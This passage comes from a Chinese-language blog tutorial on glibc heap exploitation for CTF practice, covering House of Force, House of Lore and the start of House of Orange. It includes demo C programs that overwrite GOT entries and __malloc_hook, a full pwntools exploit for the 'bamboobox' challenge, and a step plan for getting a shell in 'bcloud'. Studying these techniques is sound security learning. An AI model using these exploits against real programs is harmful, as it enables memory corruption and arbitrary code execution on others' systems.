class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>之后分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p><p>但是需要注意的是，在被抬高的同时，<strong>malloc@got 附近的内容也会被修改。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>在上一个示例中，演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;                 &lt;=== 修改top chunk size</span><br><span class="line">    malloc(140737345551056); &lt;=== 增大top chunk指针</span><br><span class="line">    malloc(0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p><p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056</code> 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure><p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure><h2 id="2-31新限制"><a href="#2-31新限制" class="headerlink" title="2.31新限制"></a>2.31新限制</h2><p>主要是对申请大小也有限制</p><p><strong>2.31以前:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><ol><li>需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于等于 -2 * MINSIZE(32位0x10,64位0x20)，这个一般情况下都是可以满足的。</li><li>需要使得 <code>request2size</code>正好转换为目标地址对应偏移的大小,注意负数与无符号数的对应</li></ol><p>这里需要注意的一个点是,虽然代码中request2size在REQUEST_OUT_OF_RANGE的后面,但是实际上运行中比较<code>((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</code>时,其实已经执行了request2size,也就是req已经是最终需要申请的大小</p><p><strong>2.31及以后:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRDIFF_MAX INT64_MAX</span></span><br><span class="line">Expands to:</span><br><span class="line"><span class="number">0x7FFFFFFFFFFFFFFF</span><span class="comment">//有符号下最大的正整数</span></span><br></pre></td></tr></table></figure><p>对申请大小的检测多了一道,需要不大于有符号下最大的正整数</p><p>也就是说不能申请一个负数了,该攻击手法不能向低地址申请任意chunk了</p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p><strong>bamboobox</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bbb&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序有一个magic后门</p><p>程序虽然没有pie,但是堆基址依然会随机化,虽然可以泄露,并以此修改got表虽然可以做,但会更麻烦一点</p><p>程序在开始申请了一个chunk专门用于存放两个函数指针,分别是进入程序和退出程序时的提示信息</p><p>而且程序在edit时,输入大小是自己任意指定的</p><p>所以利用house of force</p><p>分配chunk到第一个chunk中并修改函数指针,并退出</p><p>即可触发magic</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf_path=<span class="string">&#x27;./bbb&#x27;</span></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,tbs(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">sa(<span class="string">b&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="built_in">str</span>(idx).encode()+<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;index of item:&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&#x27;of item:&#x27;</span>,tbs(idx))</span><br><span class="line">sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">sa(<span class="string">b&#x27;the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">magic=<span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;d&quot;</span>) </span><br><span class="line">payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line">offset=-<span class="number">0x30</span>-<span class="number">0x20</span>-<span class="number">0x8</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(offset, <span class="string">b&quot;d&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>bcloud</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bcloud&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序是一个笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。</p><p>程序主要有以下几个功能</p><ol><li>新建 note，根据用户的输入 x 申请 x+4 的空间作为 note 的大小。</li><li>展示 note，啥功能也没有。。</li><li>编辑 note，根据用户指定的 note 编辑对应的内容。</li><li>删除 note，删除对应 note。</li><li>同步 note，标记所有的 note 已经被同步。</li></ol><p>然而在这五个功能中都没有明显可利用的漏洞,实际上漏洞在开始时。</p><p>在读取名字时是先读入到栈中然后再利用strcpy函数转移至堆中,都知道strcpy是遇到空字符才会停止,而栈中<strong>存储堆的指针紧邻着name缓冲区</strong>,这就意味着只要填满name缓冲区,就会将堆指针一起写到堆中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  myread((<span class="type">int</span>)s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dworr_804B0CC_name = (<span class="type">int</span>)tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后info又会将其打印出来,于是泄露了堆地址</p><p>之后的读取org和host同样是利用strcpy,不过是这次strcpy可以转移的长度更长可以利用其覆盖topchunk的size</p><p>之后</p><ol><li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回 notesize 地址处的内存，从而我们就可以控制所有 note 的大小以及对应的地址了。</li><li>修改前三个 note 的大小为 16，并修改其指针为 free@got，atoi@got，atoi@got</li><li>将 free@got 修改为 puts@plt。</li><li>泄漏 atoi 地址。</li><li>再次修改另外一个 atoi got 项为 system 地址，从而拿到 shell。</li></ol><p>这题因为环境的原因只能到此为止,无法实操了</p><p><strong>总结主要就是对strcpy的利用,不遇到\x00就不停止</strong></p><h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h2 id="概要-2"><a href="#概要-2" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p><strong>利用条件:</strong></p><ol><li>能够控制smallbin最后一个chunk 的 bk 指针</li><li>能够控制指定位置 chunk 的 fd 指针</li></ol><p><strong>利用效果:</strong>分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>当malloc申请的chunk在smallbin范围内时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，</p><p>并且同时满足之后的 bck-&gt;fd == victim 的检测，那么就可以使得 small bin 的 bk 恰好为构造的 fake chunk。</p><p>也就是说，当下一次申请 small bin 的时候，就会分配到指定位置的 fake chunk。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//bck</span></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);<span class="comment">//阻止victim合并到top</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);<span class="comment">//到unsortedbin中</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);<span class="comment">//victim从unsortedbin中被取出</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">//bk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//触发,下一次取出就是取出fakechunk</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//p4就是(intptr_t*)stack_buffer_1 + 2</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; </span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="概要-3"><a href="#概要-3" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><p><strong>利用条件:</strong></p><ol><li>要能够申请一个比top_size更大但是小于0x20000的size(任意大小申请,多次申请,top-size修改)</li></ol><p><strong>利用效果:</strong>在无free下放入一个chunk到unsortedbin中</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Otherwise, relay to handle system-dependent cases</span><br><span class="line">*/</span><br><span class="line">else &#123;</span><br><span class="line">      void *p = sysmalloc(nb, av);</span><br><span class="line">      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 ptmalloc 